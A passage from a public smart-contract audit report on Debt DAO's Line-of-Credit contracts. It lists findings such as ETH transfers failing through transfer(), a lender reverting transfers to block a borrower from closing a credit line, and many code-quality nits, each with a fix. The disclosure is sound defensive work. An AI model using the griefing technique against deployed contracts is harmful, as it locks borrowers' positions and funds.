[Amithuddar](https://github.com/code-423n4/2022-11-debtdao-findings/issues/14)*\n\nWhen withdrawing and refund  ETH, the  contract uses Solidity’s `transfer()` function.\n\nUsing Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when:\n\n*   The withdrawer smart contract does not implement a payable fallback function.\n*   The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units.\n*   The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call’s gas usage above 2300.\n\nRisks of reentrancy stemming from the use of this function can be mitigated by tightly following the \"Check-Effects-Interactions\" pattern and using OpenZeppelin Contract’s ReentrancyGuard contract. \n\n### Proof of Concept\n\n```solidity\n// Line-of-Credit/contracts/utils/LineLib.sol\n48:    payable(receiver).transfer(amount);\n```\n\n#### References:\n\nThe issues with `transfer()` are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/).\n\nFor further reference on why using Solidity’s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).\n\n### Recommended Mitigation Steps\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/369#issuecomment-1405078680)**\n\n\n\n***\n\n## [[M-11] Lender can reject closing a position](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467)\n*Submitted by [berndartmueller](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467), also found by [R2](https://github.com/code-423n4/2022-11-debtdao-findings/issues/390), [minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/352), [Jeiwan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/264), [ayeslick](https://github.com/code-423n4/2022-11-debtdao-findings/issues/170), and [0xdeadbeef0x](https://github.com/code-423n4/2022-11-debtdao-findings/issues/85)*\n\nA credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.\n\nHowever, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.\n\n### Impact\n\nThe lender can prevent the borrower from closing the credit line. This leads to the following consequences:\n\n*   Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55))\n*   Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195))\n*   Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see [SpigotedLineLib.sol#L220](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220>))\n\n### Proof of Concept\n\n[modules/credit/LineOfCredit.sol#L489-L493](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493)\n\n```solidity\nfunction _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n    if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }\n\n    // return the Lender's funds that are being repaid\n    if (credit.deposit + credit.interestRepaid > 0) {\n        LineLib.sendOutTokenOrETH(\n            credit.token,\n            credit.lender,\n            credit.deposit + credit.interestRepaid\n        );\n    }\n\n    delete credits[id]; // gas refunds\n\n    // remove from active list\n    ids.removePosition(id);\n    unchecked { --count; }\n\n    // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.\n    if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n    emit CloseCreditPosition(id);\n\n    return true;\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly.\n\n**[kibagateaux (Debt DAO) confirmed](https://github.com/code-423n4/2022-11-debtdao-findings/issues/467#issuecomment-1405078929)**\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 78 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-11-debtdao-findings/issues/454) by **IllIllI** received the top score from the judge.\n\n*The following wardens also submitted reports: [ajtra](https://github.com/code-423n4/2022-11-debtdao-findings/issues/511), \n[brgltd](https://github.com/code-423n4/2022-11-debtdao-findings/issues/508), \n[pashov](https://github.com/code-423n4/2022-11-debtdao-findings/issues/501), \n[rbserver](https://github.com/code-423n4/2022-11-debtdao-findings/issues/494), \n[c3phas](https://github.com/code-423n4/2022-11-debtdao-findings/issues/483), \n[0xNazgul](https://github.com/code-423n4/2022-11-debtdao-findings/issues/481), \n[Awesome](https://github.com/code-423n4/2022-11-debtdao-findings/issues/478), \n[immeas](https://github.com/code-423n4/2022-11-debtdao-findings/issues/475), \n[jumpdest7d](https://github.com/code-423n4/2022-11-debtdao-findings/issues/470), \n[Deivitto](https://github.com/code-423n4/2022-11-debtdao-findings/issues/468), \n[rotcivegaf](https://github.com/code-423n4/2022-11-debtdao-findings/issues/458), \n[lukris02](https://github.com/code-423n4/2022-11-debtdao-findings/issues/449), \n[joestakey](https://github.com/code-423n4/2022-11-debtdao-findings/issues/439), \n[Josiah](https://github.com/code-423n4/2022-11-debtdao-findings/issues/437), \n[djxploit](https://github.com/code-423n4/2022-11-debtdao-findings/issues/436), \n[0xSmartContract](https://github.com/code-423n4/2022-11-debtdao-findings/issues/434), \n[Trust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/426), \n[pedr02b2](https://github.com/code-423n4/2022-11-debtdao-findings/issues/423), \n[B2](https://github.com/code-423n4/2022-11-debtdao-findings/issues/419), \n[Aymen0909](https://github.com/code-423n4/2022-11-debtdao-findings/issues/415), \n[RedOneN](https://github.com/code-423n4/2022-11-debtdao-findings/issues/396), \n[cryptostellar5](https://github.com/code-423n4/2022-11-debtdao-findings/issues/395), \n[Diana](https://github.com/code-423n4/2022-11-debtdao-findings/issues/393), \n[Funen](https://github.com/code-423n4/2022-11-debtdao-findings/issues/386), \n[bulej93](https://github.com/code-423n4/2022-11-debtdao-findings/issues/385), \n[cryptonue](https://github.com/code-423n4/2022-11-debtdao-findings/issues/382), \n[a12jmx](https://github.com/code-423n4/2022-11-debtdao-findings/issues/378), \n[delfin454000](https://github.com/code-423n4/2022-11-debtdao-findings/issues/377), \n[ctf\\_sec](https://github.com/code-423n4/2022-11-debtdao-findings/issues/375), \n[\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/370), \n[minhquanym](https://github.com/code-423n4/2022-11-debtdao-findings/issues/366), \n[adriro](https://github.com/code-423n4/2022-11-debtdao-findings/issues/353), \n[erictee](https://github.com/code-423n4/2022-11-debtdao-findings/issues/296), \n[TomJ](https://github.com/code-423n4/2022-11-debtdao-findings/issues/289), \n[zaskoh](https://github.com/code-423n4/2022-11-debtdao-findings/issues/279), \n[peanuts](https://github.com/code-423n4/2022-11-debtdao-findings/issues/278), \n[merlin](https://github.com/code-423n4/2022-11-debtdao-findings/issues/263), \n[btk](https://github.com/code-423n4/2022-11-debtdao-findings/issues/251), \n[seyni](https://github.com/code-423n4/2022-11-debtdao-findings/issues/244), \n[ReyAdmirado](https://github.com/code-423n4/2022-11-debtdao-findings/issues/242), \n[0x1f8b](https://github.com/code-423n4/2022-11-debtdao-findings/issues/235), \n[saneryee](https://github.com/code-423n4/2022-11-debtdao-findings/issues/231), \n[slowmoses](https://github.com/code-423n4/2022-11-debtdao-findings/issues/227), \n[shark](https://github.com/code-423n4/2022-11-debtdao-findings/issues/220), \n[HardlyCodeMan](https://github.com/code-423n4/2022-11-debtdao-findings/issues/218), \n[apostle0x01](https://github.com/code-423n4/2022-11-debtdao-findings/issues/199), \n[tnevler](https://github.com/code-423n4/2022-11-debtdao-findings/issues/198), \n[BClabs](https://github.com/code-423n4/2022-11-debtdao-findings/issues/191), \n[carlitox477](https://github.com/code-423n4/2022-11-debtdao-findings/issues/173), \n[Rahoz](https://github.com/code-423n4/2022-11-debtdao-findings/issues/165), \n[sakman](https://github.com/code-423n4/2022-11-debtdao-findings/issues/158), \n[gogo](https://github.com/code-423n4/2022-11-debtdao-findings/issues/155), \n[0xRoxas](https://github.com/code-423n4/2022-11-debtdao-findings/issues/151), \n[catwhiskeys](https://github.com/code-423n4/2022-11-debtdao-findings/issues/148), \n[durianSausage](https://github.com/code-423n4/2022-11-debtdao-findings/issues/141), \n[csanuragjain](https://github.com/code-423n4/2022-11-debtdao-findings/issues/137), \n[fatherOfBlocks](https://github.com/code-423n4/2022-11-debtdao-findings/issues/131), \n[trustindistrust](https://github.com/code-423n4/2022-11-debtdao-findings/issues/118), \n[Deekshith99](https://github.com/code-423n4/2022-11-debtdao-findings/issues/115), \n[w0Lfrum](https://github.com/code-423n4/2022-11-debtdao-findings/issues/108), \n[aphak5010](https://github.com/code-423n4/2022-11-debtdao-findings/issues/106), \n[Saintcode\\_](https://github.com/code-423n4/2022-11-debtdao-findings/issues/103), \n[Nyx](https://github.com/code-423n4/2022-11-debtdao-findings/issues/101), \n[oyc\\_109](https://github.com/code-423n4/2022-11-debtdao-findings/issues/100), \n[i\\_got\\_hacked](https://github.com/code-423n4/2022-11-debtdao-findings/issues/91), \n[ch0bu](https://github.com/code-423n4/2022-11-debtdao-findings/issues/86), \n[rvierdiiev](https://github.com/code-423n4/2022-11-debtdao-findings/issues/77), \n[Bnke0x0](https://github.com/code-423n4/2022-11-debtdao-findings/issues/76), \n[Rolezn](https://github.com/code-423n4/2022-11-debtdao-findings/issues/65), \n[chrisdior4](https://github.com/code-423n4/2022-11-debtdao-findings/issues/46), \n[mcwildy](https://github.com/code-423n4/2022-11-debtdao-findings/issues/41), \n[HE1M](https://github.com/code-423n4/2022-11-debtdao-findings/issues/35), \n[chaduke](https://github.com/code-423n4/2022-11-debtdao-findings/issues/31), \n[martin](https://github.com/code-423n4/2022-11-debtdao-findings/issues/22), \n[Dinesh11G](https://github.com/code-423n4/2022-11-debtdao-findings/issues/20), \n[yurahod](https://github.com/code-423n4/2022-11-debtdao-findings/issues/9), and \n[RaymondFam](https://github.com/code-423n4/2022-11-debtdao-findings/issues/4).*\n\n## Low Risk Issues Summary\n| |Issue|Instances|\n|-|:-|:-:|\n| [L&#x2011;01] | Unused/empty `receive()`/`fallback()` function | 1 |\n| [L&#x2011;02] | Missing checks for `address(0x0)` when assigning values to `address` state variables | 5 |\n| [L&#x2011;03] | Open TODOs | 2 |\n\nTotal: 8 instances over 3 issues\n\n## [L&#x2011;01]  Unused/empty `receive()`/`fallback()` function\n\nIf the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. `require(msg.sender == address(weth))`). Having no access control on the function means that someone may send Ether to the contract, and have no way to get anything back out, which is a loss of funds.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n272:      receive() external payable {}\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L272\n\n## [L&#x2011;02]  Missing checks for `address(0x0)` when assigning values to `address` state variables\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n56:           arbiter = arbiter_;\n\n57:           borrower = borrower_;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L56\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n66:           swapTarget = swapTarget_;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L66\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n49:           oracle = _oracle;\n\n50:           borrower = _borrower;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L49\n\n## [L&#x2011;03]  Open TODOs\n\nCode architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n140:          // TODO: test\n\n145:          // TODO: test\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L140\n\n\n## Non-Critical Issues Summary\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;01] | Duplicate import statements | 1 |\n| [N&#x2011;02] | The `nonReentrant` `modifier` should occur before all other modifiers | 2 |\n| [N&#x2011;03] | Contract implements interface without extending the interface | 1 |\n| [N&#x2011;04] | Adding a `return` statement when the function defines a named return variable, is redundant | 5 |\n| [N&#x2011;05] | `require()`/`revert()` statements should have descriptive reason strings | 23 |\n| [N&#x2011;06] | `constant`s should be defined rather than using magic numbers | 7 |\n| [N&#x2011;07] | Numeric values having to do with time should use time units for readability | 1 |\n| [N&#x2011;08] | Use a more recent version of solidity | 1 |\n| [N&#x2011;09] | Use a more recent version of solidity | 6 |\n| [N&#x2011;10] | Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`) | 1 |\n| [N&#x2011;11] | Constant redefined elsewhere | 5 |\n| [N&#x2011;12] | Inconsistent spacing in comments | 2 |\n| [N&#x2011;13] | Non-library/interface files should use fixed compiler versions, not floating ones | 5 |\n| [N&#x2011;14] | File does not contain an SPDX Identifier | 16 |\n| [N&#x2011;15] | NatSpec is incomplete | 56 |\n| [N&#x2011;16] | Event is missing `indexed` fields | 4 |\n| [N&#x2011;17] | Not using the named return variables anywhere in the function is confusing | 2 |\n| [N&#x2011;18] | Duplicated `require()`/`revert()` checks should be refactored to a modifier or function | 2 |\n\nTotal: 140 instances over 18 issues\n\n\n## [N&#x2011;01]  Duplicate import statements\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n6:    import { ILineOfCredit } from \"../interfaces/ILineOfCredit.sol\";\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L6\n\n## [N&#x2011;02]  The `nonReentrant` `modifier` should occur before all other modifiers\n\nThis is a best-practice to protect against reentrancy in other modifiers.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n96:           nonReentrant\n\n157:          nonReentrant\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L96\n\n## [N&#x2011;03]  Contract implements interface without extending the interface\n\nNot extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit IPendleData.treasury()\n16:   contract Spigot is ISpigot, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\n\n## [N&#x2011;04]  Adding a `return` statement when the function defines a named return variable, is redundant\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n453:          return id;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L453\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n160:        return credit;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L160\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n57:           return claimed;\n\n101:          return claimed;\n\n121:          return claimed;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L57\n\n## [N&#x2011;05]  `require()`/`revert()` statements should have descriptive reason strings\n\n*There are 23 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n64:       require(escrow_.liquidate(amount, targetToken, to));\n\n90:       require(escrow.updateLine(newLine));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L64\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n112:          require(uint(status) >= uint( LineLib.STATUS.ACTIVE));\n\n241:          require(interestRate.setRate(id, drate, frate));\n\n259:          require(interestRate.setRate(id, drate, frate));\n\n326:          require(amount <= credit.principal + credit.interestAccrued);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L112\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n62:           require(defaultRevenueSplit_ <= SpigotedLineLib.MAX_SPLIT);\n\n143:        require(amount <= unusedTokens[credit.token]);\n\n160:          require(msg.sender == borrower);\n\n239:          require(msg.sender == arbiter);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L62\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n91:           require(amount > 0);\n\n105:          require(msg.sender == ILineOfCredit(self.line).arbiter());\n\n161:          require(amount > 0);\n\n198:          require(amount > 0);\n\n216:        require(msg.sender == self.line);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n147:        require(ISpigot(spigot).updateOwner(newLine));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L147\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n96:               require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n\n128:          require(revenueContract != address(this));\n\n130:          require(self.settings[revenueContract].transferOwnerFunction == bytes4(0));\n\n155:          require(success);\n\n180:          require(newOwner != address(0));\n\n189:          require(newOperator != address(0));\n\n201:          require(newTreasury != address(0));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\n\n## [N&#x2011;06]  `constant`s should be defined rather than using magic numbers\n\nEven [assembly](https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39) can benefit from using readable constants instead of hex/numeric literals.\n\n*There are 7 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit 18\n140:            decimals = 18;\n\n/// @audit 18\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit 5\n42:           uint256 _numerator = collateralValue * 10**5; // scale to 4 decimals\n\n/// @audit 5\n43:           return ((_numerator / debtValue) + 5) / 10;\n\n/// @audit 18\n113:                  deposit.assetDecimals = 18;\n\n/// @audit 18\n137:                      deposit.assetDecimals = 18;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit 100\n90:           uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L90\n\n## [N&#x2011;07]  Numeric values having to do with time should use time units for readability\n\nThere are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit 3000\n14:       uint32 constant defaultMinCRatio = 3000; // 30.00% minimum collateral ratio\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L14\n\n## [N&#x2011;08]  Use a more recent version of Solidity\n\nUse a Solidity version of at least 0.8.12 to get `string.concat()` to be used instead of `abi.encodePacked(<str>,<str>)`.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n3:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L3\n\n## [N&#x2011;09]  Use a more recent version of Solidity\n\nUse a Solidity version of at least 0.8.13 to get the ability to use `using for` with a list of free functions.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L1\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L1\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L1\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n1:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L1\n\n## [N&#x2011;10]  Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)\n\nWhile the compiler knows to optimize away the exponentiation, it's still better coding practice to use idioms that do not require compiler optimization, if they exist.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n42:           uint256 _numerator = collateralValue * 10**5; // scale to 4 decimals\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L42\n\n## [N&#x2011;11]  Constant redefined elsewhere\n\nConsider defining in only one contract so that values cannot become out of sync when only one location is updated. A [cheap way](https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678) to store constants in a single location is to create an `internal constant` in a `library`. If the variable is a local cache of another contract's value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don't get out of sync.\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n27:       address public immutable oracle;\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n29:       address public immutable borrower;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L27\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit seen in contracts/modules/credit/LineOfCredit.sol \n16:       address public immutable arbiter;\n\n/// @audit seen in contracts/modules/escrow/Escrow.sol \n17:       address public immutable oracle;\n\n/// @audit seen in contracts/modules/credit/SpigotedLine.sol \n18:       address public immutable swapTarget;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L16\n\n## [N&#x2011;12]  Inconsistent spacing in comments\n\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n58:           deadline = block.timestamp + ttl_;  //the deadline is the term/maturity/expiry date of the Line of Credit facility\n\n526:                    credits[id].principal > 0 //`id` should be placed before `p` \n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L58\n\n## [N&#x2011;13]  Non-library/interface files should use fixed compiler versions, not floating ones\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L1\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L1\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n1:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L1\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n2:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L2\n\n## [N&#x2011;14]  File does not contain an SPDX Identifier\n\n*There are 16 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L0\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L0\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L0\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L0\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L0\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n0:    pragma 